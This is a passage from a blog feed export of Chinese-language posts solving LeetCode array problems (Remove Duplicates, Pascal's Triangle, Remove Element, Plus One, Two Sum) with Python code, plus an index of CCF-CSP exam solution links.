<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        length = len(nums)</div><div class="line">        <span class="keyword">if</span> length == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            j = <span class="number">0</span></div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length):  <span class="comment"># 遍历数组</span></div><div class="line">                <span class="keyword">if</span> nums[i] != nums[i - <span class="number">1</span>]:  <span class="comment"># 不相等时</span></div><div class="line">                    j += <span class="number">1</span>  <span class="comment"># 记录游标后移</span></div><div class="line">                    nums[j] = nums[i]  <span class="comment"># 记录</span></div><div class="line">            <span class="keyword">return</span> j + <span class="number">1</span>  <span class="comment"># 返回结果</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　使用游标 i 遍历数组，然后使用一个游标 j，当 i 向后遍历数组时，如果遇到 nums[i] 与 nums[j] 不同，则将 nums[i] 和 nums[j+1] 交换，同时 游标 j 向右移动一个位置，然后 i 继续向后遍历，重复上述过程直到遍历结束。 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span><span class="params">(self, nums)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        length = len(nums)</div><div class="line">        <span class="keyword">if</span> length == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            j = <span class="number">0</span></div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, length):</div><div class="line">                <span class="keyword">if</span> nums[i] != nums[j]:</div><div class="line">                    nums[i], nums[j+<span class="number">1</span>] = nums[j+<span class="number">1</span>], nums[i]</div><div class="line">                    j += <span class="number">1</span></div><div class="line">            <span class="keyword">return</span> j+<span class="number">1</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 118. Pascal's Triangle</title>
    <url>/2018/12/04/LeetCode-118-Pascal-s-Triangle/</url>
    <content><![CDATA[<center>LeetCode 118. Pascal’s Triangle</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文</strong></li>
</ul>
<p>Given a non-negative integer <em>numRows</em>, generate the first <em>numRows</em> of Pascal’s triangle.</p>
<p>In Pascal’s triangle, each number is the sum of the two numbers directly above it.</p>
<ul>
<li><strong>中文</strong></li>
</ul>
<p>给定一个非负整数 <em>numRows，</em>生成杨辉三角的前 <em>numRows</em> 行。</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/PascalTriangleAnimated2.gif" alt=""></p>
<p>在杨辉三角中，每个数是它左上方和右上方的数的和。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: 5</div><div class="line">输出:</div><div class="line">[</div><div class="line">     [1],</div><div class="line">    [1,1],</div><div class="line">   [1,2,1],</div><div class="line">  [1,3,3,1],</div><div class="line"> [1,4,6,4,1]</div><div class="line">]</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　规律：（1）第 i 层有 i 个元素。（2）每层第一个以及最后一个元素值为 1。（3）对于第 <code>i (i &gt; 2)</code> 层第 <code>j（j &gt; 1 &amp;&amp; j &lt; i）</code> 个元素 <code>A[i][j]</code>，A<code>[i][j] = A[i-1][j-1] + A[i-1][j]</code> 。依据以上规律，使用二维数组来实现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self, numRows)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type numRows: int</div><div class="line">        :rtype: List[List[int]]</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> numRows == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> []</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            L = [[<span class="number">1</span>]]</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, numRows):</div><div class="line">            L1 = []</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>):</div><div class="line">                <span class="keyword">if</span> j == <span class="number">0</span> <span class="keyword">or</span> j == i:	<span class="comment"># 处理每层第一个以及最后一个元素</span></div><div class="line">                    L1.append(<span class="number">1</span>)</div><div class="line">                <span class="keyword">else</span>:	<span class="comment"># 中间元素由+得到</span></div><div class="line">                    L1.append(L[i<span class="number">-1</span>][j] + L[i<span class="number">-1</span>][j<span class="number">-1</span>])</div><div class="line">                    </div><div class="line">            L.append(L1)   </div><div class="line">        <span class="keyword">return</span> L</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　思路与题解 1 一样，简化的写法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self, numRows)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type numRows: int</div><div class="line">        :rtype: List[List[int]]</div><div class="line">        """</div><div class="line">        res = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(numRows):</div><div class="line">            res.append([<span class="number">1</span>])</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, i + <span class="number">1</span>):</div><div class="line">                <span class="keyword">if</span> j == i:</div><div class="line">                    res[i].append(<span class="number">1</span>)</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    res[i].append(res[i - <span class="number">1</span>][j - <span class="number">1</span>] + res[i - <span class="number">1</span>][j])</div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 27. Remove Element</title>
    <url>/2018/12/03/LeetCode-27-Remove%20Element/</url>
    <content><![CDATA[<center>LeetCode 27. Remove Element 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong></li>
</ul>
<p>Given an array <em>nums</em> and a value <em>val</em>, remove all instances of that value <a href="https://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="external"><strong>in-place</strong></a> and return the new length.</p>
<p>Do not allocate extra space for another array, you must do this by <strong>modifying the input array in-place</strong> with O(1) extra memory.</p>
<p>The order of elements can be changed. It doesn’t matter what you leave beyond the new length.</p>
<ul>
<li><strong>中文：</strong></li>
</ul>
<p>给定一个数组 <em>nums</em> 和一个值 <em>val</em>，你需要<strong>原地</strong>移除所有数值等于 <em>val</em> 的元素，返回移除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须在<strong>原地修改输入数组</strong>并在使用 O(1) 额外空间的条件下完成。</p>
<p>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">给定 nums = [3,2,2,3], val = 3,</div><div class="line"></div><div class="line">函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。</div><div class="line"></div><div class="line">你不需要考虑数组中超出新长度后面的元素。</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">给定 nums = [0,1,2,2,3,0,4,2], val = 2,</div><div class="line"></div><div class="line">函数应该返回新的长度 5, 并且 nums 中的前五个元素为 0, 1, 3, 0, 4。</div><div class="line"></div><div class="line">注意这五个元素可为任意顺序。</div><div class="line"></div><div class="line">你不需要考虑数组中超出新长度后面的元素。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　使用两个游标 i 和 j 来遍历数组，如果 第 i 个元素的值等于 val，则使用 j 记录位置，同时递增 i，直到下一个不等于 val 的元素出现，将此时 i 对应的值复制到 j 的位置上，再增加 j ，重复上述过程直到遍历结束。最后，j 就是新数组的长度。 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeElement</span><span class="params">(self, nums, val)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type val: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        j = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):  <span class="comment"># 遍历数组</span></div><div class="line">            <span class="keyword">if</span> nums[i] != val:  <span class="comment"># 不等于时才记录</span></div><div class="line">                nums[j] = nums[i]  <span class="comment"># 复制不等于 val 的值</span></div><div class="line">                j += <span class="number">1</span>  <span class="comment"># 新数组的长度</span></div><div class="line">        <span class="keyword">return</span> j</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　使用列表的 <code>pop()</code> 方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeElement</span><span class="params">(self, nums, val)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type val: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="keyword">while</span> val <span class="keyword">in</span> nums:  <span class="comment"># 如果列表中还有目标元素</span></div><div class="line">            nums.pop(nums.index(val))  <span class="comment"># 移除该元素</span></div><div class="line">        <span class="keyword">return</span> len(nums)</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 3</strong></li>
</ul>
<p>　　使用 <code>del</code> 语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeElement</span><span class="params">(self, nums, val)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type val: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="keyword">while</span> val <span class="keyword">in</span> nums:  <span class="comment"># 如果列表中还有目标元素</span></div><div class="line">            <span class="keyword">del</span> nums[nums.index(val)]  <span class="comment"># 移除该元素</span></div><div class="line">        <span class="keyword">return</span> len(nums)</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 4</strong></li>
</ul>
<p>　　使用列表的 <code>remove()</code> 方法（此方法效率最高）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeElement</span><span class="params">(self, nums, val)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type val: int</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        <span class="keyword">while</span> val <span class="keyword">in</span> nums:  <span class="comment"># 如果列表中还有目标元素</span></div><div class="line">            nums.remove(val)  <span class="comment"># 移除该元素</span></div><div class="line">        <span class="keyword">return</span> len(nums)</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 66. Plus One</title>
    <url>/2018/12/02/LeetCode-66-Plus-One/</url>
    <content><![CDATA[<center>LeetCode 66. Plus One</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong></li>
</ul>
<p>Given a <strong>non-empty</strong> array of digits representing a non-negative integer, plus one to the integer.</p>
<p>The digits are stored such that the most significant digit is at the head of the list, and each element in the array contain a single digit.</p>
<p>You may assume the integer does not contain any leading zero, except the number 0 itself.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个由<strong>整数</strong>组成的<strong>非空</strong>数组所表示的非负整数，在该数的基础上加一。</p>
<p>最高位数字存放在数组的首位， 数组中每个元素只存储一个数字。</p>
<p>你可以假设除了整数 0 之外，这个整数不会以零开头。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [1,2,3]</div><div class="line">输出: [1,2,4]</div><div class="line">解释: 输入数组表示数字 123。</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [4,3,2,1]</div><div class="line">输出: [4,3,2,2]</div><div class="line">解释: 输入数组表示数字 4321。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　直接对列表最后 1 个数进行加1的操作，如果不等于10，即无需进位，则直接返回加 1 后的数组，否则，处理进位。从数组的尾部开始，依次往前处理进位的情况。如果数组最前面的数依然需要进位，则在数组前增加一个 1。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">plusOne</span><span class="params">(self, digits)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type digits: List[int]</div><div class="line">        :rtype: List[int]</div><div class="line">        """</div><div class="line">        digits[len(digits) - <span class="number">1</span>] += <span class="number">1</span>  <span class="comment"># 最后 1 位加 1</span></div><div class="line">        <span class="keyword">if</span> digits[len(digits) - <span class="number">1</span>] &lt; <span class="number">10</span>:  <span class="comment"># 如果没有进位则直接返回数组</span></div><div class="line">            <span class="keyword">return</span> digits</div><div class="line">        flag = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(digits) - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):  <span class="comment"># 处理有进位的情况</span></div><div class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>:  <span class="comment"># 进位处理</span></div><div class="line">                digits[i] += <span class="number">1</span>  <span class="comment"># 进 1 位</span></div><div class="line">                flag = <span class="number">0</span>  <span class="comment"># 进位标志清除</span></div><div class="line">            <span class="keyword">if</span> digits[i] == <span class="number">10</span>:  <span class="comment"># 需要进位</span></div><div class="line">                digits[i] = <span class="number">0</span>  <span class="comment"># 该位清空，先前进 1 位</span></div><div class="line">                flag = <span class="number">1</span>  <span class="comment"># 标志进位</span></div><div class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:  <span class="comment"># 如果最前面的数也要进位，则在数组前增加1</span></div><div class="line">            <span class="keyword">return</span> [<span class="number">1</span>] + digits</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> digits</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　考察的就是加法进位的问题，把数组最后 1 个数加 1 也看作是进位。从后向前依次处理进位的情况，然后记录到结果列表中。如果数组最前面的数依然需要进位，则把进位值插入到数组最前面。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">plusOne</span><span class="params">(self, digits)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type digits: List[int]</div><div class="line">        :rtype: List[int]</div><div class="line">        """</div><div class="line">        res = []  <span class="comment"># 结果列表</span></div><div class="line">        sum = <span class="number">0</span></div><div class="line">        one = <span class="number">1</span>  <span class="comment"># 进位值</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(digits) - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):  <span class="comment"># 从后向前处理</span></div><div class="line">            sum = one + digits[i]  <span class="comment"># 进位值加上当前值</span></div><div class="line">            one = int(sum / <span class="number">10</span>)  <span class="comment"># 是否要向前进位</span></div><div class="line">            res.insert(<span class="number">0</span>, int(sum) % <span class="number">10</span>)  <span class="comment"># 记录到结果列表</span></div><div class="line">        <span class="keyword">if</span> one &gt; <span class="number">0</span>:  <span class="comment"># 如果最后还有进位，插入到列表最前面</span></div><div class="line">            res.insert(<span class="number">0</span>, one)</div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 题解博客汇总</title>
    <url>/2018/12/01/CCF-CSP-%E9%A2%98%E8%A7%A3%E5%8D%9A%E5%AE%A2%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<center>教女朋友学Python系列之 CCF-CSP 题解博客汇总与索引目录（持续更新）。</center>

<a id="more"></a>
<h5 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h5><ul>
<li><a href="http://fanzhenyu.me/2018/09/17/CCF-CSP-%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E6%9C%80%E5%A4%9A%E7%9A%84%E6%95%B0/" target="_blank" rel="external">201312-1 出现次数最多的数</a></li>
<li><a href="http://fanzhenyu.me/2018/09/18/CCF-CSP-%E7%9B%B8%E5%8F%8D%E6%95%B0/" target="_blank" rel="external">201403-1 相反数</a></li>
<li><a href="http://fanzhenyu.me/2018/09/21/CCF-CSP-%E7%9B%B8%E9%82%BB%E6%95%B0%E5%AF%B9/" target="_blank" rel="external">201409-1 相邻数对</a></li>
<li><a href="http://fanzhenyu.me/2018/09/21/CCF-CSP-%E9%97%A8%E7%A6%81%E7%B3%BB%E7%BB%9F/" target="_blank" rel="external">201412-1 门禁系统</a></li>
<li><a href="http://fanzhenyu.me/2018/09/26/CCF-CSP-%E5%9B%BE%E5%83%8F%E6%97%8B%E8%BD%AC%E4%B8%8E%E6%95%B0%E4%BD%8D%E4%B9%8B%E5%92%8C/" target="_blank" rel="external">201503-1 图像旋转</a></li>
<li><a href="http://fanzhenyu.me/2018/09/21/CCF-CSP-%E6%95%B0%E5%88%97%E5%88%86%E6%AE%B5%E4%B8%8E%E6%8A%98%E7%82%B9%E8%AE%A1%E6%95%B0/" target="_blank" rel="external">201509-1 数列分段</a></li>
<li><a href="http://fanzhenyu.me/2018/09/26/CCF-CSP-%E5%9B%BE%E5%83%8F%E6%97%8B%E8%BD%AC%E4%B8%8E%E6%95%B0%E4%BD%8D%E4%B9%8B%E5%92%8C/" target="_blank" rel="external">201512-1 数位之和</a></li>
<li><a href="http://fanzhenyu.me/2018/09/21/CCF-CSP-%E6%95%B0%E5%88%97%E5%88%86%E6%AE%B5%E4%B8%8E%E6%8A%98%E7%82%B9%E8%AE%A1%E6%95%B0/" target="_blank" rel="external">201604-1 折点计数</a></li>
<li><a href="http://fanzhenyu.me/2018/09/26/CCF-CSP-%E6%9C%80%E5%A4%A7%E6%B3%A2%E5%8A%A8%E4%B8%8E%E4%B8%AD%E9%97%B4%E6%95%B0/" target="_blank" rel="external">201609-1 最大波动</a></li>
<li><a href="http://fanzhenyu.me/2018/09/26/CCF-CSP-%E6%9C%80%E5%A4%A7%E6%B3%A2%E5%8A%A8%E4%B8%8E%E4%B8%AD%E9%97%B4%E6%95%B0/" target="_blank" rel="external">201612-1 中间数</a></li>
<li><a href="http://fanzhenyu.me/2018/09/27/CCF-CSP-%E5%88%86%E8%9B%8B%E7%B3%95%E4%B8%8E%E6%89%93%E9%85%B1%E6%B2%B9/" target="_blank" rel="external">201703-1 分蛋糕</a></li>
<li><a href="http://fanzhenyu.me/2018/09/27/CCF-CSP-%E5%88%86%E8%9B%8B%E7%B3%95%E4%B8%8E%E6%89%93%E9%85%B1%E6%B2%B9/" target="_blank" rel="external">201709-1 打酱油</a></li>
<li><a href="http://fanzhenyu.me/2018/09/27/CCF-CSP-%E6%9C%80%E5%B0%8F%E5%B7%AE%E5%80%BC%E4%B8%8E%E8%B7%B3%E4%B8%80%E8%B7%B3/" target="_blank" rel="external">201712-1 最小差值</a></li>
<li><a href="http://fanzhenyu.me/2018/09/27/CCF-CSP-%E6%9C%80%E5%B0%8F%E5%B7%AE%E5%80%BC%E4%B8%8E%E8%B7%B3%E4%B8%80%E8%B7%B3/" target="_blank" rel="external">201803-1 跳一跳</a></li>
</ul>
<h5 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h5><ul>
<li><a href="http://fanzhenyu.me/2018/10/14/CCF-CSP-ISBN%E5%8F%B7%E7%A0%81/" target="_blank" rel="external">201312-2 ISBN号码</a></li>
<li><a href="http://fanzhenyu.me/2018/11/30/CCF-CSP-%E7%AA%97%E5%8F%A3/" target="_blank" rel="external">201403-2 窗口</a></li>
<li><a href="http://fanzhenyu.me/2018/10/28/CCF-CSP-%E6%B6%88%E9%99%A4%E7%B1%BB%E6%B8%B8%E6%88%8F%E5%92%8C%E7%94%BB%E5%9B%BE/" target="_blank" rel="external">201409-2 画图</a></li>
<li>201412-2 Z字形扫描</li>
<li><a href="http://fanzhenyu.me/2018/10/27/CCF-CSP-%E6%95%B0%E5%AD%97%E6%8E%92%E5%BA%8F/" target="_blank" rel="external">201503-2 数字排序</a></li>
<li><a href="http://fanzhenyu.me/2018/10/28/CCF-CSP-%E6%97%A5%E6%9C%9F%E8%AE%A1%E7%AE%97/" target="_blank" rel="external">201509-2 日期计算</a></li>
<li><a href="http://fanzhenyu.me/2018/10/28/CCF-CSP-%E6%B6%88%E9%99%A4%E7%B1%BB%E6%B8%B8%E6%88%8F%E5%92%8C%E7%94%BB%E5%9B%BE/" target="_blank" rel="external">201512-2 消除类游戏</a></li>
<li>201604-2 俄罗斯方块</li>
<li><a href="http://fanzhenyu.me/2018/10/21/CCF-CSP-%E7%81%AB%E8%BD%A6%E8%B4%AD%E7%A5%A8/" target="_blank" rel="external">201609-2 火车购票</a></li>
<li>201612-2 工资计算</li>
<li><a href="http://fanzhenyu.me/2018/11/26/CCF-CSP-%E5%AD%A6%E7%94%9F%E6%8E%92%E9%98%9F/" target="_blank" rel="external">201703-2 学生排队</a></li>
<li>201709-2 公共钥匙盒</li>
<li><a href="http://fanzhenyu.me/2018/10/28/CCF-CSP-%E6%B8%B8%E6%88%8F/" target="_blank" rel="external">201712-2 游戏</a></li>
<li>201803-2 碰撞的小球</li>
</ul>
<h5 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h5><ul>
<li>201312-3 最大的矩形</li>
<li>201403-3 命令行选项</li>
<li>201409-3 字符串匹配 </li>
<li>201412-3 集合竞价</li>
<li>201503-3 节日</li>
<li>201509-3 模板生成系统</li>
<li>201512-3 画图</li>
<li>201604-3 路径解析</li>
<li>201609-3 炉石传说</li>
<li>201612-3 权限查询</li>
<li>201703-3 Markdown</li>
<li>201709-3 JSON查询</li>
<li>201712-3 Crontab</li>
<li>201803-3 URL映射</li>
</ul>
<p>……（未完待续）</p>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 1. Two Sum</title>
    <url>/2018/12/01/LeetCode-1-Two-Sum/</url>
    <content><![CDATA[<center>LeetCode 1. Two Sum 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文</strong></li>
</ul>
<p>Given an array of integers, return <strong>indices</strong> of the two numbers such that they add up to a specific target.</p>
<p>You may assume that each input would have <strong>exactly</strong> one solution, and you may not use the <em>same</em> element twice.</p>
<ul>
<li><strong>中文</strong></li>
</ul>
<p>给定一个整数数组和一个目标值，找出数组中和为目标值的<strong>两个</strong>数。</p>
<p>你可以假设每个输入只对应一种答案，且同样的元素不能被重复利用。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">给定 nums = [2, 7, 11, 15], target = 9</div><div class="line"></div><div class="line">因为 nums[0] + nums[1] = 2 + 7 = 9</div><div class="line">所以返回 [0, 1]</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　两层循环暴力求解，对于列表的每个数，依次使其与其后所有的数单独求和，判断和是否为目标值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, nums, target)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type target: int</div><div class="line">        :rtype: List[int]</div><div class="line">        """</div><div class="line">        length = len(nums)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length - <span class="number">1</span>):</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, length):  <span class="comment"># i 之后的数</span></div><div class="line">                <span class="keyword">if</span> nums[i] + nums[j] == target:  <span class="comment"># 判断是否等于目标值</span></div><div class="line">                    <span class="keyword">return</span> i, j</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　用一层循环，直接在里面查询 <code>target-nums[i]</code> 是否存在于 <code>nums</code> 列表中，速度比题解 1 快了许多。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, nums, target)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type target: int</div><div class="line">        :rtype: List[int]</div><div class="line">        """</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</div><div class="line">            x = target - nums[i]</div><div class="line">            <span class="keyword">if</span> x <span class="keyword">in</span> nums:  <span class="comment"># 是否有对应的数与 nums[i] 的和为目标值</span></div><div class="line">                j = nums.index(x)</div><div class="line">                <span class="keyword">if</span> i == j:</div><div class="line">                    <span class="keyword">continue</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    <span class="keyword">return</span> i, j  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 3</strong> </li>
</ul>
<p>　　遍历数组，然后使用字典，键为 <code>target-nums[i]</code>，值为 <code>i</code> ，依次判断 <code>nums[i]</code> 是否已经在字典中，如果是，则输出结果，即和为目标值的两个数。否则把 <code>target-nums[i]</code> 的值存入字典。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, nums, target)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums: List[int]</div><div class="line">        :type target: int</div><div class="line">        :rtype: List[int]</div><div class="line">        """</div><div class="line">        d = &#123;&#125;</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</div><div class="line">            x = target - nums[i]</div><div class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> d:  <span class="comment"># 判断是否已经在字典中</span></div><div class="line">                <span class="keyword">return</span> d[nums[i]], i  <span class="comment"># 输出结果</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                d[x] = i  <span class="comment"># 存入字典</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 窗口</title>
    <url>/2018/11/30/CCF-CSP-%E7%AA%97%E5%8F%A3/</url>
    <content><![CDATA[<center>CCF-CSP 201403-2 窗口 题解</center>

<a id="more"></a>
